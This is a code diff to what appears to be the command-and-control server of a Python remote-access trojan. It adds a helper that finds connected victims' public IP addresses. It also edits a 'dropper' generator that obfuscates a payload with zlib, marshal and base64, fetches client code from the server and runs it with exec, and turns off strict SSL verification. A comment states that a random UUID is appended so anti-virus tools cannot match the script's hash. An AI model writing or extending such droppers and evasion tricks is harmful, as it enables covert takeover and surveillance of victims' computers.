@@ -11,6 +11,7 @@ import datetime
 import itertools
 import time
 import geocoder
+import ipaddress
 
 class C2:
     def __init__(self, sio):
@@ -32,6 +33,36 @@ class C2:
         print(f"Current time: {datetime.datetime.utcnow()}")
 
 
+    def get_client_ip(self, environ):
+            header_priority = [
+                'HTTP_X_FORWARDED_FOR',
+                'HTTP_X_REAL_IP',
+                'HTTP_X_FORWARDED',
+                'HTTP_X_CLUSTER_CLIENT_IP',
+                'HTTP_FORWARDED_FOR',
+                'HTTP_FORWARDED',
+                'HTTP_CLIENT_IP',
+                'REMOTE_ADDR'
+            ]
+            
+            for header in header_priority:
+                if header in environ:
+                    ip_list = environ[header].split(',')
+                    for ip in reversed(ip_list):
+                        ip = ip.strip()
+                        try:
+                            ip_obj = ipaddress.ip_address(ip)
+                            print(ip_obj)
+                            if not ip_obj.is_private:
+                                print(f"Found public IP in {header}: {ip}")
+                                return ip
+                        except ValueError:
+                            continue
+            
+            # If no public IP is found, return the first IP from X-Forwarded-For or None
+            return environ.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip() or None
+
+
     def on_connect(self, sid, data):
         print(f"New device connected with sid {sid}")
 
@@ -40,13 +71,9 @@ class C2:
             print("Error: Could not retrieve environment details for this connection")
             return
 
-        # Get the client IP address
-        client_ip = environ.get('REMOTE_ADDR')
-        
-        # If the server is behind a reverse proxy, check the 'X-Forwarded-For' header
-        x_forwarded_for = environ.get('HTTP_X_FORWARDED_FOR')
-        if x_forwarded_for:
-            client_ip = x_forwarded_for.split(',')[0]  # Get the first IP in the list
+        print(f"X-Forwarded-For: {environ.get('HTTP_X_FORWARDED_FOR', '')}")
+
+        client_ip = self.get_client_ip(environ)
 
         print(f"IP: {client_ip}")
 
@@ -203,9 +230,10 @@ def create_moduel(url):
   return module
 create_moduel(url+"client/client.py").run(url, file_path)"""
             
-        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss
+        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,requests,importlib.util,mss,ssl
 from PIL import Image
 from urllib.request import urlopen
+ssl._create_default_https_context = ssl._create_stdlib_context
 exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
 #{uuid.uuid4()}"""
         #this will prevent anti-viruses from looking for hashes of the script
